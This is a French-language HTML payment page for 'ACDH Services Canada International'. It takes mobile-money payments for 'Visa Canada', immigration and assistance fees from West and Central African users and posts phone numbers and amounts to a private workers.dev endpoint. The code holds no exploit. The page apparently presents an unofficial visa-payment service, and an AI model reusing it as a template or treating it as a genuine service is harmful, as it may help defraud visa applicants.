<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<title>Paiement - ACDH Services Canada International</title>

<style>
body {
  font-family: Arial;
  background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
  display: flex;
  justify-content: center;
  align-items: center;
  height: 100vh;
}

.box {
  background: white;
  padding: 30px;
  border-radius: 12px;
  width: 360px;
  text-align: center;
}

input, select {
  width: 100%;
  padding: 10px;
  margin-top: 10px;
}

button {
  width: 100%;
  padding: 12px;
  margin-top: 15px;
  background: #00bcd4;
  color: white;
  border: none;
  font-weight: bold;
}

#displayAmount {
  margin-top: 10px;
  font-weight: bold;
}
</style>
</head>

<body>

<div class="box">

<h2>PAIEMENT ACDH</h2>

<select id="service" onchange="updateAmount()">
  <option value="visa">Visa Canada</option>
  <option value="immigration">Immigration</option>
  <option value="assistance">Assistance</option>
</select>

<select id="country" onchange="updateOperators(); updateAmount(); toggleCurrency()">
  <option value="CIV">Côte d'Ivoire</option>
  <option value="CMR">Cameroun</option>
  <option value="COD">RDC</option>
  <option value="COG">Congo</option>
  <option value="GAB">Gabon</option>
  <option value="SEN">Sénégal</option>
  <option value="BEN">Bénin</option>
</select>

<select id="currency" style="display:none" onchange="updateAmount()">
  <option value="CDF">CDF</option>
  <option value="USD">USD</option>
</select>

<select id="operator"></select>

<input type="text" id="phone" placeholder="Numéro">

<input type="hidden" id="amount">
<p id="displayAmount"></p>

<button onclick="payer()">Payer maintenant</button>

<p id="result"></p>

</div>

<script>

// 💳 SERVICES (USD)
const services = {
  visa: 10,
  immigration: 20,
  assistance: 5
};

// 🌍 DEVISES
const currencies = {
  BEN: "XOF",
  CIV: "XOF",
  SEN: "XOF",
  CMR: "XAF",
  GAB: "XAF",
  COG: "XAF",
  COD: null
};

// 📡 OPERATEURS (dashboard réel)
const operators = {
  BEN: ["MTN", "MOOV"],
  CMR: ["MTN"],
  CIV: ["MTN", "ORANGE"],
  COD: ["AIRTEL", "ORANGE", "VODACOM"],
  GAB: ["AIRTEL"],
  COG: ["AIRTEL", "MTN"],
  SEN: ["ORANGE", "FREE"]
};

// 🔓 OPERATEURS ACTIFS
const activeProviders = {
  BEN: ["MTN", "MOOV"],
  CMR: ["MTN"],
  CIV: ["MTN", "ORANGE"],
  COD: ["AIRTEL", "ORANGE", "VODACOM"],
  GAB: ["AIRTEL"],
  COG: ["AIRTEL", "MTN"],
  SEN: ["ORANGE"]
};

// 📞 PREFIXES
const prefixes = {
  BEN: "229",
  CIV: "225",
  CMR: "237",
  COD: "243",
  COG: "242",
  GAB: "241",
  SEN: "221"
};

let exchangeRates = {};

// 💱 API TAUX
async function loadRates() {
  try {
    const res = await fetch("https://open.er-api.com/v6/latest/USD");
    const data = await res.json();
    exchangeRates = data.rates;
  } catch {
    console.log("Erreur taux");
  }
}

// 🔄 OPERATEURS
function updateOperators() {
  const country = document.getElementById("country").value;
  const select = document.getElementById("operator");
  const phone = document.getElementById("phone");

  select.innerHTML = "";

  operators[country].forEach(op => {
    if (activeProviders[country].includes(op)) {
      const option = document.createElement("option");
      option.value = op;
      option.textContent = op;
      select.appendChild(option);
    }
  });

  phone.value = prefixes[country];
}

// 🔒 PREFIXE
document.getElementById("phone").addEventListener("input", function () {
  const country = document.getElementById("country").value;
  const prefix = prefixes[country];

  if (!this.value.startsWith(prefix)) {
    this.value = prefix;
  }
});

// 🌍 RDC devise
function toggleCurrency() {
  const country = document.getElementById("country").value;
  const currencySelect = document.getElementById("currency");

  currencySelect.style.display = country === "COD" ? "block" : "none";
}

// 💱 CONVERSION
function updateAmount() {
  const service = document.getElementById("service").value;
  const country = document.getElementById("country").value;

  const usd = services[service];

  const currency = country === "COD"
    ? document.getElementById("currency").value
    : currencies[country];

  if (!exchangeRates[currency]) return;

  const converted = Math.round(usd * exchangeRates[currency]);

  document.getElementById("amount").value = converted;

  document.getElementById("displayAmount").innerText =
    "Montant à payer : " + converted + " " + currency;
}

// 💳 PAIEMENT
async function payer() {

  const phone = document.getElementById("phone").value;
  const amount = document.getElementById("amount").value;
  const country = document.getElementById("country").value;
  const operator = document.getElementById("operator").value;
  const result = document.getElementById("result");

  if (!phone || phone.length < 8) {
    result.innerText = "Numéro invalide";
    return;
  }

  result.innerText = "Traitement...";

  try {
    const res = await fetch("https://orange-queen.serviceprive93.workers.dev/deposit", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ phone, amount, country, operator })
    });

    const data = await res.json();

    result.innerText =
      data.status === "SUCCESS" ? "Paiement réussi"
      : data.status === "PENDING" ? "En attente"
      : "Échec";

  } catch {
    result.innerText = "Erreur réseau";
  }
}

// 🚀 INIT
loadRates().then(() => {
  updateOperators();
  updateAmount();
  toggleCurrency();
});

</script>

</body>
</html>
